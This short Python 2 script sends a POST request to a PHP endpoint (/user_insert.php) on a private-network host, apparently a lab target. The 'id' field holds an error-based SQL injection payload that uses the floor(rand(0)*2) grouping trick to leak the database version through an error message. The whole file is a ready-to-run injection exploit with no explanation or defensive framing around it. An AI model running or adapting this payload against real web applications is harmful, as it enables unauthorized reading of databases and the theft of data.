import httplib
import urllib

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36", "Content-type": "application/x-www-form-urlencoded", "Accept": "text/html", "Connection": "keep-alive"}

domain = "192.168.126.128"
url = "/user_insert.php"
params = "id=test\',(select x from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)T))#&name=test"

conn = httplib.HTTPConnection(domain,"80")
#conn = httplib.HTTPSConnection(domain,"443")
conn.request("POST",url,params,headers)
response=conn.getresponse().read()
print response